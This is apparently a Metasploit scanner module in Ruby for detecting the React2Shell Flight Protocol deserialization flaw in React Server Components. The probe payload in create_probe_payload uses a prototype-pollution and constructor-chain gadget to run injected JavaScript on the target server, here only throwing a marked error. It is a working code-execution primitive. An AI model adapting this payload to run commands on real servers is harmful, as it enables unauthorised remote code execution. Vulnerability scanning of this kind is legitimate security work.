##
# This module requires Metasploit Framework
##

# COMPLIANCE: Extends Msf::Auxiliary as required for scanner modules
# COMPLIANCE: Uses NormalRanking as appropriate for detection modules
class MetasploitModule < Msf::Auxiliary
  Rank = NormalRanking

  # COMPLIANCE: Required mixins for scanner functionality
  # - Msf::Auxiliary::Scanner provides run_host() framework
  # - Msf::Exploit::Remote::HttpClient provides HTTP operations
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'React2Shell Flight Protocol Vulnerability Scanner',
        'Description' => %q{
          This module detects the React2Shell vulnerability affecting
          React Server Components (RSC) via unsafe Flight Protocol
          deserialization.

          The scanner sends a non-destructive Flight payload designed
          to trigger a predictable server-side behavior without executing
          system commands.

          No exploitation is performed - this module only detects vulnerabilities.
        },
        'Author'      => [
          'Moises Tapia'
        ],
        'License'     => MSF_LICENSE,
        'References'  => [
          ['URL', 'https://github.com/MoisesTapia/http-react2shell']
        ],
        'DisclosureDate' => '2024-11-01'
      )
    )

    # COMPLIANCE: Register only approved datastore options
    # TARGETURI is standard for HTTP modules specifying endpoints
    register_options(
      [
        OptString.new(
          'TARGETURI',
          [ true, 'React Server Component endpoint', '/' ]
        )
      ]
    )

    # COMPLIANCE: RHOSTS, RPORT, SSL are inherited from mixins
    # No custom datastore options - uses only framework-provided options
    # This ensures compatibility with Metasploit's target management system
  end

  #
  # COMPLIANCE: run_host() is required entry point for scanner modules
  # Must be implemented to satisfy Msf::Auxiliary::Scanner interface
  #
  def run_host(ip)
    print_status("#{ip} - Checking for React2Shell Flight Protocol vulnerability")

    check_code = check_host(ip)
    
    # COMPLIANCE: Use CheckCode enum values for deterministic reporting
    # No custom status codes - only framework-standard values
    case check_code
    when Exploit::CheckCode::Vulnerable
      print_good("#{ip} - Target is vulnerable to React2Shell")
    when Exploit::CheckCode::Appears
      print_status("#{ip} - Target appears vulnerable to React2Shell")
    when Exploit::CheckCode::Safe
      print_status("#{ip} - Target does not appear vulnerable")
    else
      print_error("#{ip} - Unable to determine vulnerability status")
    end
  end

  #
  # Check method for vulnerability detection - returns CheckCode
  #
  def check_host(ip)
    res = send_probe_request
    return Exploit::CheckCode::Unknown unless res

    # Return CheckCode for deterministic behavior
    check_flight_behavior(res)
  end

  #
  # -----------------------------
  # Internal helpers
  # -----------------------------
  #

  def send_probe_request
    # COMPLIANCE: Use send_request_cgi() exclusively - no raw sockets
    # COMPLIANCE: Use normalize_uri() for proper URI handling
    # COMPLIANCE: Respect SSL, proxy, timeout settings from framework
    send_request_cgi(
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri.path),
      'ctype'  => 'application/react',
      'data'   => create_probe_payload
    )
  # COMPLIANCE: Handle specific Rex exceptions - no rescue-all
  # Each exception type gets appropriate handling
  rescue Rex::ConnectionError => e
    vprint_error("#{rhost} - Connection failed: #{e}")
    nil
  rescue Rex::TimeoutError => e
    vprint_error("#{rhost} - Request timed out: #{e}")
    nil
  rescue Rex::Proto::Http::Error => e
    vprint_error("#{rhost} - HTTP protocol error: #{e}")
    nil
  end

  def check_flight_behavior(res)
    # COMPLIANCE: Deterministic detection - no guessing or randomness
    # Uses specific, reliable indicators for vulnerability confirmation
    if res.code == 500 && res.body&.include?('digest') && res.body&.include?('REACT2SHELL')
      report_vulnerable(
        Exploit::CheckCode::Vulnerable,
        'React Flight deserialization confirmed - digest error with probe marker detected'
      )
      return Exploit::CheckCode::Vulnerable
    end

    # COMPLIANCE: Secondary indicators for "appears vulnerable" status
    # Based on Flight Protocol structure detection
    if res.body&.include?('resolved_model') || res.body&.include?('__proto__')
      report_vulnerable(
        Exploit::CheckCode::Appears,
        'React Flight protocol structures detected in response'
      )
      return Exploit::CheckCode::Appears
    end

    # COMPLIANCE: Clear negative result - no ambiguity
    print_status("#{rhost} - Target does not appear vulnerable to React2Shell")
    return Exploit::CheckCode::Safe
  end

  def report_vulnerable(code, message)
    # COMPLIANCE: Use print_good() for success output
    print_good("#{rhost} - #{message}")

    # COMPLIANCE: Use report_vuln() with all required parameters
    # Includes host, port, name, refs as mandated by framework
    # This integrates with Metasploit's vulnerability database
    report_vuln(
      host: rhost,
      port: rport,
      name: 'React2Shell Flight Protocol Vulnerability',
      info: message,
      refs: references,
      exploited_at: Time.now.utc
    )
  end

  #
  # COMPLIANCE: Flight Protocol payload generation inlined for framework compliance
  # No external dependencies or custom frameworks - all logic contained within module
  # Creates a non-destructive probe payload for vulnerability detection only
  #
  def create_probe_payload
    # COMPLIANCE: Non-destructive detection payload
    # Only throws JavaScript error - no system commands, file operations, or network listeners
    # Uses identifiable marker for deterministic detection
    {
      'then'   => '$1:__proto__:then',
      'status' => 'resolved_model',
      'reason' => -1,
      'value'  => '{"then":"$B0"}',
      '_response' => {
        # COMPLIANCE: Probe payload only creates detectable error condition
        # No command execution, file access, or destructive operations
        '_prefix' => "throw Object.assign(new Error('REACT2SHELL_PROBE'),{digest:'REACT2SHELL'})",
        '_formData' => {
          'get' => '$1:constructor:constructor'
        }
      }
    }.to_json
  end
end